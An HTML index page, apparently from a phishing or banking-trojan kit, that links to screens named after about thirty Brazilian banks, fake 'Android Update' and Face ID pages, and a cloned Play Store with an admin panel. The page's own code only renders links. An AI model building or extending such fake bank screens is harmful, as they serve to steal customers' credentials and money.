<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Telas FKS - Painel</title>
<style>
* { margin:0; padding:0; box-sizing:border-box; }
body { font-family: 'Google Sans', Roboto, Arial, sans-serif; background:#f0f2f5; color:#202124; padding:24px; }
h1 { font-size:24px; margin-bottom:4px; }
.sub { color:#5f6368; font-size:14px; margin-bottom:24px; }
.grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(180px,1fr)); gap:12px; }
.card { background:#fff; border-radius:12px; padding:16px; text-align:center; text-decoration:none; color:inherit; border:1px solid #e8eaed; transition:box-shadow .15s, transform .15s; display:flex; flex-direction:column; align-items:center; gap:8px; }
.card:hover { box-shadow:0 4px 12px rgba(0,0,0,.1); transform:translateY(-2px); }
.card .emoji { font-size:36px; line-height:1; }
.card .name { font-size:14px; font-weight:500; }
.card .path { font-size:11px; color:#5f6368; word-break:break-all; }
.section { margin-bottom:32px; }
.section h2 { font-size:18px; margin-bottom:12px; color:#1a73e8; }
</style>
</head>
<body>
<h1>📱 Telas FKS</h1>
<p class="sub">Painel unificado de todas as telas - clique para abrir</p>

<div class="section">
<h2>🏦 Bancos</h2>
<div class="grid" id="bankGrid"></div>
</div>

<div class="section">
<h2>🛠️ Utilitários</h2>
<div class="grid" id="utilGrid"></div>
</div>

<div class="section">
<h2>📦 Play Store</h2>
<div class="grid" id="playGrid"></div>
</div>

<script>
var base = '/';
var banks = [
  {name:"AGI", file:base+"AGI.html", emoji:"🏦"},
  {name:"BANESTES", file:base+"BANESTES.html", emoji:"🏦"},
  {name:"BANRISUL", file:base+"BANRISUL.html", emoji:"🏦"},
  {name:"BB", file:base+"BB.html", emoji:"🏦"},
  {name:"BMG", file:base+"BMG.html", emoji:"🏦"},
  {name:"BRADESCO", file:base+"BRADESCO.html", emoji:"🏦"},
  {name:"BRB", file:base+"BRB.html", emoji:"🏦"},
  {name:"BTG", file:base+"BTG.html", emoji:"🏦"},
  {name:"BV", file:base+"BV.html", emoji:"🏦"},
  {name:"C6", file:base+"C6.html", emoji:"🏦"},
  {name:"CAIXA", file:base+"CAIXA.html", emoji:"🏦"},
  {name:"INTER", file:base+"INTER.html", emoji:"🏦"},
  {name:"ITAU", file:base+"ITAU.html", emoji:"🏦"},
  {name:"ITI", file:base+"ITI.html", emoji:"🏦"},
  {name:"MP", file:base+"MP.html", emoji:"🏦"},
  {name:"NEON", file:base+"NEON.html", emoji:"🏦"},
  {name:"NEXT", file:base+"NEXT.html", emoji:"🏦"},
  {name:"NOMAD", file:base+"NOMAD.html", emoji:"🏦"},
  {name:"NUBANK", file:base+"NUBANK.html", emoji:"🏦"},
  {name:"ORIGINAL", file:base+"ORIGINAL.html", emoji:"🏦"},
  {name:"PAGBANK", file:base+"PAGBANK.html", emoji:"🏦"},
  {name:"PAN", file:base+"PAN.html", emoji:"🏦"},
  {name:"PICPAY", file:base+"PICPAY.html", emoji:"🏦"},
  {name:"SAFRA", file:base+"SAFRA.html", emoji:"🏦"},
  {name:"SANTANDER", file:base+"SANTANDER.html", emoji:"🏦"},
  {name:"SICOOB", file:base+"SICOOB.html", emoji:"🏦"},
  {name:"SICREDI", file:base+"SICREDI.html", emoji:"🏦"},
  {name:"STONE", file:base+"STONE.html", emoji:"🏦"},
  {name:"WILL", file:base+"WILL.html", emoji:"🏦"},
  {name:"XP", file:base+"XP.html", emoji:"🏦"},
];

var pbase = '/kingshot-clone/public/';
var utils = [
  {name:"Android Update", file:base+"android-update.html", emoji:"📲"},
  {name:"Digital Simulator", file:base+"digital-simulator.html", emoji:"🖥️"},
  {name:"Face ID Simulator", file:base+"face-id-simulator.html", emoji:"😀"},
];

var playItems = [
  {name:"Play Store - Kingshot", file:pbase+"index.html", emoji:"▶️"},
  {name:"Admin - Play Store", file:pbase+"admin-static.html", emoji:"⚙️"},
  {name:"Telas - Painel", file:pbase+"telas.html", emoji:"📋"},
];

function renderGrid(items, gridId) {
  var grid = document.getElementById(gridId);
  grid.innerHTML = items.map(function(item) {
    return '<a class="card" href="' + item.file + '" target="_blank"><div class="emoji">' + item.emoji + '</div><div class="name">' + item.name + '</div><div class="path">' + item.file + '</div></a>';
  }).join('');
}

renderGrid(banks, 'bankGrid');
renderGrid(utils, 'utilGrid');
renderGrid(playItems, 'playGrid');
</script>
</body>
</html>
